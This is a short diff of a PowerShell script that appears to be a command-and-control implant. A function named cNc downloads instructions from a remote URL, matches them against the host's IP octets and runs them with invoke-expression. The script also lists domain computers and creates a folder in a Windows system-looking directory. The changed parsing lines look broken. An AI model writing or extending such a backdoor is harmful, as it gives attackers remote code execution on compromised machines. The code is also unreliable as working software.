@@ -41,11 +41,11 @@ $domainSystemInfo = get-adcomputer -filter * -Properties ipv4address | select ip
 
 function cNc{
     $httpCommand=invoke-restmethod $cNcURL
-    $read = @()
+    $httpCommand | out-file -filepath .\rf.txt
+
+    [string[]]$read = get-command -path .\rf.txt
+    rm .\rf.txt
     
-    foreach($line in Get-Content $httpCommand) {
-        $read += $line
-    }
     if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
         if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
             invoke-expression $read[2]
@@ -56,6 +56,7 @@ function cNc{
 
     
 }
+
 if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTextServiceDa.txt')){
     try{mkdir 'C:\Program Files (x86)\Windows NT\TableTextService'}
     catch{}
